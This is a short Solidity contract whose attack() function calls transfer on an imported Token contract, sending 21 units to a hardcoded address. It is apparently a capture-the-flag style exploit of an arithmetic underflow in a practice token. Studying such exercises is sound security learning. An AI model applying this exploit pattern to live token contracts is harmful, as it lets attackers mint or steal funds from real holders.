// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";

contract TokenS {

    Token public token; 

    constructor(address _token) public {
        token = Token(_token);
    }


    function attack() public payable {
        token.transfer({_to : 0xb8A775273901055E6B9F04cE2184b019eb2A453A, _value : 21});
    }

}
